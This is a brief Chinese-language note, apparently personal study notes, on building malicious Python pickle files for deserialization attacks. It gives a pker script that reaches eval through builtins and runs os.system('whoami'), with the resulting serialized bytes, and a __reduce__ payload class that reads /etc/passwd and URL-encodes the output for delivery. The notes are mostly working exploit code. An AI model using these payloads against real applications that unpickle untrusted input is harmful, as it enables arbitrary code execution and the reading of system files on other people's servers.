- > [参考](https://xz.aliyun.com/t/7012)
- # 构造恶意Pickle文件
	- 某些特定的 Python 代码可以直接被转成 Pickle
	- 可以：
		- 变量赋值 存到 memo 中，保存 memo 下标和变量名即可
		- 函数调用
		- 类型字面量构造
		- list 和 dict 成员修改
		- 对象成员变量修改
	- 可以用[这个工具](https://github.com/EddieIvan01/pker)生成
	- ```shell
	  $ cat test/code_breaking
	  getattr = GLOBAL('builtins', 'getattr')
	  dict = GLOBAL('builtins', 'dict')
	  dict_get = getattr(dict, 'get')
	  globals = GLOBAL('builtins', 'globals')
	  builtins = globals()
	  __builtins__ = dict_get(builtins, '__builtins__')
	  eval = getattr(__builtins__, 'eval')
	  eval('__import__("os").system("whoami")')
	  return
	  
	  $ python3 pker.py < test/code_breaking
	  b'cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\'get\'\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\'__builtins__\'\ntRp5\n0g0\n(g5\nS\'eval\'\ntRp6\n0g6\n(S\'__import__("os").system("whoami")\'\ntR.'
	  ```
- # Pickle文件OPCODE分析
	- `python -m pickletools pickle.pkl`
- # 基础
	- 把生成的 bytes 加载即可执行任意代码
	- 对象被 pickle 反序列化时，pickle 会调用对象的`__reduce__`方法（如果有）来获得反序列化的方法
	- ```python
	  #!/usr/bin/python2
	  import pickle
	  import urllib
	  class payload(object):
	      def __reduce__(self):
	         return (eval, ("open('/etc/passwd','r').read()",))
	  a = pickle.dumps(payload())
	  a = urllib.quote(a)
	  print a
	  ```
-